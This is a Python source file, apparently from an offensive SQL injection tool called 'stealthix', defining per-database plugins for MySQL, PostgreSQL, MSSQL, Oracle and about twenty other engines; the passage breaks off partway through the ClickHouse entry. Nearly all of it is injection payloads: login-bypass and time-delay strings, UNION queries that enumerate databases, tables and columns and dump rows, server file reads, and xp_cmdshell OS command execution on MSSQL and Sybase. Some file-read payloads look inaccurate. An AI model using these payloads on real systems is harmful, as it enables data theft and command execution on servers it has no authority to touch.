from __future__ import annotations

from stealthix.plugins.base import Plugin

SQL_PLUGINS = [
    Plugin(
        "mysql",
        "sql",
        dbms="mysql",
        payloads=["' OR '1'='1", "' OR SLEEP(3)-- "],
        fingerprints=["mysql", "mariadb"],
        error_signatures=["you have an error in your sql syntax", "warning: mysql", "sqlstate"],
        version_queries=[
            "' UNION SELECT @@version--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
        ],
        privilege_checks=["' UNION SELECT user()--", "' UNION SELECT current_user()--"],
        os_queries=["' UNION SELECT @@version_compile_os--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT schema_name FROM information_schema.schemata--"],
                "patterns": [r"schema[:=\s]+([a-z0-9_]+)", r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT LOAD_FILE('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "postgresql",
        "sql",
        dbms="postgresql",
        payloads=["' OR '1'='1", "'; SELECT pg_sleep(3);-- "],
        fingerprints=["postgres", "psql"],
        error_signatures=["postgres", "syntax error", "sqlstate"],
        version_queries=[
            "' UNION SELECT version()--",
            "' UNION SELECT current_database()--",
            "' UNION SELECT current_user--",
        ],
        privilege_checks=["' UNION SELECT current_user--", "' UNION SELECT session_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT datname FROM pg_database--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"datname[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT tablename FROM pg_tables--"],
                "patterns": [r"tablename[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT pg_read_file('{path}',0,2000)--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "mssql",
        "sql",
        dbms="mssql",
        payloads=["' OR 1=1--", "'; WAITFOR DELAY '0:0:3'-- "],
        fingerprints=["microsoft sql", "mssql", "odbc"],
        error_signatures=["microsoft sql server", "unclosed quotation mark", "odbc"],
        version_queries=["' UNION SELECT @@version--", "' UNION SELECT DB_NAME()--"],
        privilege_checks=[
            "' UNION SELECT SYSTEM_USER--",
            "' UNION SELECT IS_SRVROLEMEMBER('sysadmin')--",
        ],
        os_queries=["' UNION SELECT @@version--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": [
                    "' UNION SELECT name FROM master..sysdatabases--",
                    "' UNION SELECT name FROM sys.databases--",
                ],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": [
                    "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
                    "' UNION SELECT name FROM sys.tables--",
                    "' UNION SELECT table_name FROM information_schema.tables--",
                ],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": [
                    "' UNION SELECT name FROM syscolumns--",
                    "' UNION SELECT name FROM sys.columns--",
                    "' UNION SELECT column_name FROM information_schema.columns--",
                ],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {
                "payloads": [
                    "' UNION SELECT BulkColumn FROM OPENROWSET(BULK '{path}',SINGLE_CLOB) AS x--",
                    "' UNION SELECT BulkColumn FROM OPENROWSET(BULK '{path}',SINGLE_BLOB) AS x--",
                ]
            },
            "os": {
                "payloads": [
                    "'; EXEC master..xp_cmdshell '{command}';--",
                    "'; EXEC xp_cmdshell '{command}';--",
                ]
            },
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "oracle",
        "sql",
        dbms="oracle",
        payloads=["' OR '1'='1", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- "],
        fingerprints=["ora-", "oracle"],
        error_signatures=["ora-", "oracle"],
        version_queries=[
            "' UNION SELECT banner FROM v$version--",
            "' UNION SELECT USER FROM dual--",
        ],
        privilege_checks=["' UNION SELECT USER FROM dual--"],
        os_queries=["' UNION SELECT banner FROM v$version--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": [
                    "' UNION SELECT username FROM all_users--",
                    "' UNION SELECT username FROM user_users--",
                ],
                "patterns": [r"schema[:=\s]+([a-z0-9_]+)", r"username[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": [
                    "' UNION SELECT table_name FROM all_tables--",
                    "' UNION SELECT table_name FROM user_tables--",
                ],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": [
                    "' UNION SELECT column_name FROM all_tab_columns--",
                    "' UNION SELECT column_name FROM user_tab_columns--",
                ],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "sqlite",
        "sql",
        dbms="sqlite",
        payloads=["' OR '1'='1", "'; SELECT randomblob(1000000);-- "],
        fingerprints=["sqlite"],
        error_signatures=["sqlite"],
        version_queries=["' UNION SELECT sqlite_version()--"],
        privilege_checks=["' UNION SELECT sqlite_version()--"],
        os_queries=[],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {"payloads": ["' UNION SELECT 'main'--"], "patterns": [r"(main)"]},
            "tables": {
                "payloads": ["' UNION SELECT name FROM sqlite_master WHERE type='table'--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT sql FROM sqlite_master WHERE type='table'--"],
                "patterns": [r"create\s+table\s+\w+\s*\(([^)]+)\)"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "h2",
        "sql",
        dbms="h2",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["h2 database"],
        error_signatures=["h2"],
        version_queries=["' UNION SELECT H2VERSION()--", "' UNION SELECT VERSION()--"],
        privilege_checks=["' UNION SELECT USER()--"],
        os_queries=["' UNION SELECT H2VERSION()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT database_name FROM information_schema.databases--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"database_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT FILE_READ('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "hsqldb",
        "sql",
        dbms="hsqldb",
        payloads=["' OR '1'='1", "'; CALL SLEEP(3);-- "],
        fingerprints=["hsqldb", "hypersql"],
        error_signatures=["hsqldb", "hypersql"],
        version_queries=["' UNION SELECT HSQLDB_VERSION()--"],
        privilege_checks=["' UNION SELECT USER()--"],
        os_queries=["' UNION SELECT HSQLDB_VERSION()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": [
                    "' UNION SELECT database_name FROM information_schema.system_tables--"
                ],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"database_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT FILE_READ('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "mariadb",
        "sql",
        dbms="mariadb",
        payloads=["' OR '1'='1", "' OR SLEEP(3)-- "],
        fingerprints=["mariadb"],
        error_signatures=["mariadb", "sql syntax"],
        version_queries=["' UNION SELECT VERSION()--"],
        privilege_checks=["' UNION SELECT USER()--"],
        os_queries=["' UNION SELECT @@version_compile_os--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT schema_name FROM information_schema.schemata--"],
                "patterns": [r"schema[:=\s]+([a-z0-9_]+)", r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT LOAD_FILE('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "percona",
        "sql",
        dbms="percona",
        payloads=["' OR '1'='1", "' OR SLEEP(3)-- "],
        fingerprints=["percona"],
        error_signatures=["percona", "mysql", "sql syntax"],
        version_queries=["' UNION SELECT VERSION()--", "' UNION SELECT @@version--"],
        privilege_checks=["' UNION SELECT USER()--", "' UNION SELECT current_user()--"],
        os_queries=["' UNION SELECT @@version_compile_os--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT schema_name FROM information_schema.schemata--"],
                "patterns": [r"schema[:=\s]+([a-z0-9_]+)", r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT LOAD_FILE('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "memsql",
        "sql",
        dbms="memsql",
        payloads=["' OR '1'='1", "' OR SLEEP(3)-- "],
        fingerprints=["memsql", "singlestore"],
        error_signatures=["memsql", "singlestore", "mysql"],
        version_queries=["' UNION SELECT VERSION()--", "' UNION SELECT @@version--"],
        privilege_checks=["' UNION SELECT USER()--"],
        os_queries=["' UNION SELECT @@version_compile_os--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT schema_name FROM information_schema.schemata--"],
                "patterns": [r"schema[:=\s]+([a-z0-9_]+)", r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT LOAD_FILE('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "drizzle",
        "sql",
        dbms="drizzle",
        payloads=["' OR '1'='1", "' OR SLEEP(3)-- "],
        fingerprints=["drizzle"],
        error_signatures=["drizzle", "mysql"],
        version_queries=["' UNION SELECT VERSION()--"],
        privilege_checks=["' UNION SELECT USER()--"],
        os_queries=["' UNION SELECT @@version_compile_os--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT schema_name FROM information_schema.schemata--"],
                "patterns": [r"schema[:=\s]+([a-z0-9_]+)", r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT LOAD_FILE('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "db2",
        "sql",
        dbms="db2",
        payloads=[
            "' OR '1'='1",
            "'; VALUES CHAR(TIMESTAMPDIFF(2, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP));-- ",
        ],
        fingerprints=["db2"],
        error_signatures=["db2"],
        version_queries=["' UNION SELECT version FROM sysibm.sysversions--"],
        privilege_checks=["' UNION SELECT current user FROM sysibm.sysdummy1--"],
        os_queries=["' UNION SELECT os_name FROM sysibm.sysenvinfo--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT current server FROM sysibm.sysdummy1--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"server[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": [
                    "' UNION SELECT tabname FROM syscat.tables--",
                    "' UNION SELECT tabname FROM syscat.tables FETCH FIRST 10 ROWS ONLY--",
                ],
                "patterns": [r"tabname[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": [
                    "' UNION SELECT colname FROM syscat.columns--",
                    "' UNION SELECT colname FROM syscat.columns FETCH FIRST 10 ROWS ONLY--",
                ],
                "patterns": [r"colname[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "redshift",
        "sql",
        dbms="redshift",
        payloads=["' OR '1'='1", "'; SELECT pg_sleep(3);-- "],
        fingerprints=["redshift", "amazon redshift"],
        error_signatures=["redshift", "amazon redshift", "postgres"],
        version_queries=[
            "' UNION SELECT version()--",
            "' UNION SELECT current_database()--",
            "' UNION SELECT current_user--",
        ],
        privilege_checks=["' UNION SELECT current_user--", "' UNION SELECT session_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT datname FROM pg_database--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"datname[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": [
                    "' UNION SELECT tablename FROM pg_tables--",
                    "' UNION SELECT table_name FROM information_schema.tables--",
                ],
                "patterns": [r"tablename[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT pg_read_file('{path}',0,2000)--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "greenplum",
        "sql",
        dbms="greenplum",
        payloads=["' OR '1'='1", "'; SELECT pg_sleep(3);-- "],
        fingerprints=["greenplum", "pivotal greenplum"],
        error_signatures=["greenplum", "postgres"],
        version_queries=["' UNION SELECT version()--", "' UNION SELECT current_database()--"],
        privilege_checks=["' UNION SELECT current_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT datname FROM pg_database--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"datname[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT tablename FROM pg_tables--"],
                "patterns": [r"tablename[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT pg_read_file('{path}',0,2000)--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "vertica",
        "sql",
        dbms="vertica",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["vertica"],
        error_signatures=["vertica"],
        version_queries=["' UNION SELECT version()--", "' UNION SELECT current_database()--"],
        privilege_checks=["' UNION SELECT current_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT database_name FROM v_catalog.databases--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"database_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM v_catalog.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM v_catalog.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT readfile('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "yellowbrick",
        "sql",
        dbms="yellowbrick",
        payloads=["' OR '1'='1", "'; SELECT pg_sleep(3);-- "],
        fingerprints=["yellowbrick"],
        error_signatures=["yellowbrick", "postgres"],
        version_queries=["' UNION SELECT version()--", "' UNION SELECT current_database()--"],
        privilege_checks=["' UNION SELECT current_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT datname FROM pg_database--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"datname[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT tablename FROM pg_tables--"],
                "patterns": [r"tablename[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT pg_read_file('{path}',0,2000)--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "enterprisedb",
        "sql",
        dbms="enterprisedb",
        payloads=["' OR '1'='1", "'; SELECT pg_sleep(3);-- "],
        fingerprints=["enterprisedb", "edb"],
        error_signatures=["enterprisedb", "postgres"],
        version_queries=["' UNION SELECT version()--", "' UNION SELECT current_database()--"],
        privilege_checks=["' UNION SELECT current_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT datname FROM pg_database--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"datname[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT tablename FROM pg_tables--"],
                "patterns": [r"tablename[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT pg_read_file('{path}',0,2000)--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "yugabyte_ysql",
        "sql",
        dbms="yugabyte_ysql",
        payloads=["' OR '1'='1", "'; SELECT pg_sleep(3);-- "],
        fingerprints=["yugabyte", "ysql"],
        error_signatures=["yugabyte", "postgres"],
        version_queries=["' UNION SELECT version()--", "' UNION SELECT current_database()--"],
        privilege_checks=["' UNION SELECT current_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT datname FROM pg_database--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"datname[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT tablename FROM pg_tables--"],
                "patterns": [r"tablename[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT pg_read_file('{path}',0,2000)--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "firebird",
        "sql",
        dbms="firebird",
        payloads=["' OR '1'='1", "'; SELECT COUNT(*) FROM RDB$DATABASE--"],
        fingerprints=["firebird", "interbase"],
        error_signatures=["firebird", "interbase", "dynamic sql error"],
        version_queries=[
            "' UNION SELECT RDB$GET_CONTEXT('SYSTEM', 'ENGINE_VERSION') FROM RDB$DATABASE--"
        ],
        privilege_checks=["' UNION SELECT CURRENT_USER FROM RDB$DATABASE--"],
        os_queries=["' UNION SELECT RDB$GET_CONTEXT('SYSTEM', 'OS_VERSION') FROM RDB$DATABASE--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT RDB$DATABASE_NAME FROM RDB$DATABASE--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"database_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": [
                    "' UNION SELECT RDB$RELATION_NAME FROM RDB$RELATIONS WHERE RDB$VIEW_BLR IS NULL--"
                ],
                "patterns": [r"relation_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT RDB$FIELD_NAME FROM RDB$RELATION_FIELDS--"],
                "patterns": [r"field_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {
                "payloads": [
                    "' UNION SELECT RDB$GET_CONTEXT('SYSTEM', '{path}') FROM RDB$DATABASE--"
                ]
            },
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "sybase",
        "sql",
        dbms="sybase",
        payloads=["' OR 1=1--", "'; WAITFOR DELAY '0:0:3'-- "],
        fingerprints=["sybase", "adaptive server"],
        error_signatures=["sybase", "adaptive server", "unclosed quotation"],
        version_queries=["' UNION SELECT @@version--", "' UNION SELECT DB_NAME()--"],
        privilege_checks=["' UNION SELECT SUSER_NAME()--", "' UNION SELECT USER_NAME()--"],
        os_queries=["' UNION SELECT @@version--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT name FROM master..sysdatabases--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT name FROM sysobjects WHERE xtype='U'--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT name FROM syscolumns--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT xp_readfile('{path}')--"]},
            "os": {"payloads": ["'; EXEC master..xp_cmdshell '{command}';--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "sap_maxdb",
        "sql",
        dbms="sap_maxdb",
        payloads=["' OR 1=1--", "'; SELECT SLEEP(3);-- "],
        fingerprints=["sap maxdb", "maxdb", "sap db"],
        error_signatures=["sap maxdb", "maxdb"],
        version_queries=["' UNION SELECT VERSION FROM SYS.VERSIONS--"],
        privilege_checks=["' UNION SELECT USER FROM SYS.DUAL--"],
        os_queries=["' UNION SELECT VERSION FROM SYS.VERSIONS--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT DATABASENAME FROM SYS.DATABASES--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"databasename[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT TABLENAME FROM SYS.TABLES--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"tablename[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT COLUMNNAME FROM SYS.COLUMNS--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"columnname[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "informix",
        "sql",
        dbms="informix",
        payloads=["' OR 1=1--", "'; SELECT SLEEP(3);-- "],
        fingerprints=["informix", "ibm informix"],
        error_signatures=["informix", "ibm informix", "sql error"],
        version_queries=["' UNION SELECT DBINFO('VERSION', 'FULL') FROM systables WHERE tabid=1--"],
        privilege_checks=["' UNION SELECT USER FROM systables WHERE tabid=1--"],
        os_queries=["' UNION SELECT DBINFO('VERSION', 'FULL') FROM systables WHERE tabid=1--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT name FROM sysdatabases--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT tabname FROM systables--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"tabname[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT colname FROM syscolumns--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"colname[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "monetdb",
        "sql",
        dbms="monetdb",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["monetdb"],
        error_signatures=["monetdb", "syntax error"],
        version_queries=["' UNION SELECT * FROM sys.version()--"],
        privilege_checks=["' UNION SELECT current_user FROM sys.users--"],
        os_queries=["' UNION SELECT * FROM sys.version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT name FROM sys.databases--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT name FROM sys.tables--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT name FROM sys.columns--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT sys.read_file('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "clickhouse",
        "sql",
        dbms="clickhouse",
        payloads=["' OR '1'='1", "' AND sleep(3)-- "],
        fingerprints=["clickhouse"],
        error_signatures=["clickhouse", "syntax error"],
        version_queries=[
            "' UNION SELECT version()--",
            "' UNION SELECT * FROM system.build_options--",
        ],
        privilege_checks=["' UNION SELECT current_user()--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT name FROM system.databases--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT name FROM system.tables--"],
